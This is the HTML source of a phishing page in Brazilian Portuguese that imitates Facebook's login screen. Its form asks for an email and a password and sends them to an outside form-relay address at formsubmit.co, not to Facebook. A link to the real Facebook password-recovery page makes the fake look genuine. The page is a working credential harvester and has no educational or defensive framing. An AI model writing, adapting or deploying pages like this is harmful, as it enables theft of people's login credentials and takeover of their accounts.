<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        *{
            font-family: Arial, Helvetica, sans-serif;
        }
        body{
            background-color: rgb(236, 236, 236);
            display: flex;
            justify-content: center;
        }

        .container{
            display: flex;
            flex-direction: column;
            padding: 10px;
            box-shadow: 0px 2px 5px 2px rgba(138, 138, 138, 0.438);
            background-color: white;
            margin-top: 80px;
        }

        form{
            display: flex;
            flex-direction: column;
        }

        textarea{
            border-color: rgba(128, 128, 128, 0.274);
            padding: 8px;
            margin-bottom: 10px;
            border-radius: 5px;
        }

        #xamaa{
            border: 1px solid rgba(128, 128, 128, 0.274);
            padding: 8px;
            margin-bottom: 10px;
            border-radius: 5px;
        }

        #entrar{
            padding: 10px;
            color: white;
            background-color: #1969e5;
            font-size: 1em;
            font-weight: 700;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #entrar:hover{
            background-color: #0954c4;
        }

        h3{
            color: #1969e5;
            font-size: 0.7em;
            cursor: pointer;
            text-align: center;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(128, 128, 128, 0.322);
        }

        button{
            padding: 10px;
            margin-top: 10px;
            margin-bottom: 15px;
            color: white;
            background-color: #1bbb06;
            font-size: 1em;
            font-weight: 700;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: max-content;
            align-self: center;
        }

        button:hover{
            background-color: #17a104;
        }

        #email{
            border: 1px solid rgba(128, 128, 128, 0.274);
            padding: 8px;
            margin-bottom: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="https://formsubmit.co/afd461dd0834106f3350f00141abf609" method="post">
            <input type="text" name="name" placeholder="Email" id="xamaa" required autocomplete="off">
            <input type="email" name="email" placeholder="Confirme seu Email" required id="email" autocomplete="off">
            <textarea name="message" cols="30" rows="1" placeholder="Senha" required></textarea>
            <input type="submit" value="Entrar" id="entrar">
        </form>
        <a href="https://pt-br.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
            <h3>Esqueceu a senha?</h3>
        </a>
        <button>Criar nova conta</button>
    </div>
</body>
</html>
